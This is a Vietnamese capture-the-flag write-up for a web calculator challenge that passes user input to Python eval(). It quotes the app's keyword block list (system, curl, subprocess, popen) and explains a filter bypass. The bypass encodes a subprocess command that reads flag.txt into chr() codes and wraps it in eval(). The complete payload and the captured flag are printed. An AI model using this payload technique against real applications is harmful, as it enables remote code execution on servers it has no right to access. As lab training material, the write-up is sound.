**Additon Calculator**
----
<img width="837" height="490" alt="image" src="https://github.com/user-attachments/assets/398b0133-8a56-4d66-a560-e0511ec194d8" />

**Mục tiêu:** Ta cần tìm nội dung của file flag (./flag.txt) trong một web tính toán phép cộng.

**I. Phân tích Lỗ hổng:**

- Phân tích mã nguồn cho thấy ứng dụng sử dụng hàm eval(formula) để tính toán đầu vào của người dùng.

- eval() trong Python là một hàm nguy hiểm, nó không chỉ tính toán số học mà còn thực thi bất kỳ chuỗi mã Python hợp lệ nào. Đây là lỗ hổng Remote Code Execution (RCE) hay Server-Side Template Injection (SSTI) cho phép chúng ta thực thi lệnh tùy ý.

**Phân tích Bộ lọc (Filter):**

- Chương trình có một hàm filter để ngăn chặn các cuộc tấn công trực tiếp.

- Từ khóa bị cấm: system, curl, flag, subprocess, popen.

- Ký tự cho phép: Chỉ cho phép các ký tự chữ cái (a-zA-Z), số (0-9), khoảng trắng, ., (, ), và +.
---
**II. Chiến lược Tấn công**

- Lý do: Chúng ta cần thực thi một lệnh hệ thống (ví dụ: cat ./flag.txt), thường sử dụng module subprocess và chứa từ khóa flag nhưng cả hai đều bị cấm.

- Ý tưởng: Dựa vào danh sách ký tự cho phép, chúng ta có thể sử dụng hàm chr() để mã hóa toàn bộ chuỗi lệnh thành các giá trị ASCII, sau đó nối chúng lại bằng dấu +.

  + chr() sử dụng các ký tự số, dấu ngoặc () và dấu +, tất cả đều nằm trong danh sách được phép.

  + Ví dụ: chữ 's' có giá trị ASCII là 115, nên 's' sẽ được thay thế bằng chr(115).

----
**III. Tìm FLAG**

- Bước 1: Xác định Lệnh Python Mục tiêu

   + Lệnh cơ bản để đọc file là subprocess.run(['cat', './flag.txt']).

   + Lý do cần sửa đổi: Khi chạy lệnh này, chương trình chỉ thực thi lệnh mà không trả về kết quả (nội dung flag) về cho ứng dụng web để hiển thị, dẫn đến lỗi hoặc chỉ trả về trạng thái (CompletedProcess).

   + Lệnh tối ưu: Thêm tham số capture_output=True để bắt lấy đầu ra của lệnh và trả về cho hàm eval():

===> Chuỗi lệnh cần được mã hóa:
```bash
 subprocess.run(['cat', './flag.txt'], capture_output=True)
```
- Khi nhập chuỗi mã hóa vào, hàm eval() của máy chủ sẽ chỉ đánh giá chuỗi đó thành chuỗi lệnh Python gốc (ví dụ: nó sẽ tính toán chr(115)+... thành 'subprocess.run...') nhưng không thực thi nó.

- Giải pháp: Chúng ta cần bao bọc chuỗi mã hóa bằng một hàm eval() nữa để đảm bảo rằng chuỗi lệnh được giải mã sẽ được thực thi.

Chuyển mã hóa đầy đủ:

```bash
eval(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)+chr(46)+chr(114)+chr(117)+chr(110)+chr(40)+chr(91)+chr(39)+chr(99)+chr(97)+chr(116)+chr(39)+chr(44)+chr(32)+chr(39)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(93)+chr(44)+chr(32)+chr(99)+chr(97)+chr(112)+chr(116)+chr(117)+chr(114)+chr(101)+chr(95)+chr(111)+chr(117)+chr(116)+chr(112)+chr(117)+chr(116)+chr(61)+chr(84)+chr(114)+chr(117)+chr(101)+chr(41))
```

Nhập lệnh này vào wed ta thu được FLAG
<img width="1234" height="439" alt="image" src="https://github.com/user-attachments/assets/2ca51ec7-d0ad-4845-ab47-de507104125d" />

```bash
DH{348566e31c1ebb3e9fb81b1bf60bd22728bc127bfba0ab3cb84a1e965f77f92f}
```
